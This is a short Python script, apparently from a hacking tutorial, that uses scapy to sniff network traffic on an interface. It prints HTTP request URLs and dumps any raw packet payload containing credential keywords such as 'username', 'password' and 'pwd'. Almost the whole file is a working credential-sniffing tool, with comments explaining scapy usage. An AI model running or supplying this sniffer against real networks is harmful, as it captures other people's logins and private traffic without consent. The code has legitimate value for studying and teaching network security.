#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    # store=False is to tell scapy not to store packets in memory so that not much load on our computer
    # prn specifies a callback function fir EACH packet captured
    # the filter argument follows the Berkeley packet filter (BPF) syntax eg. udp/tcp/arp/port 21(if you want ftp)
    # but BPF doesnt allow to filter packets that's being sent on HTTP, so we use 3rd party module - scappy-http
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)   #, filter="")


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    # for all request types we use scapy.arp, scapy.Ether, etc.
    # But only for http we used http since since does not have a http filter by default
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        # username is one option but the web developer might use any other word also for the username on the page
        keywords = ["username", "user", "login", "password", "pass", "usr", "pwd", "admin"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    # this works for HTTP only not HTTPS
    if packet.haslayer(http.HTTPRequest):
        # packet.show() splits the info as Ether, IP, TCP, HTTP, Raw(for the content sent)
        # print(packet.show())
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")

sniff("eth0")
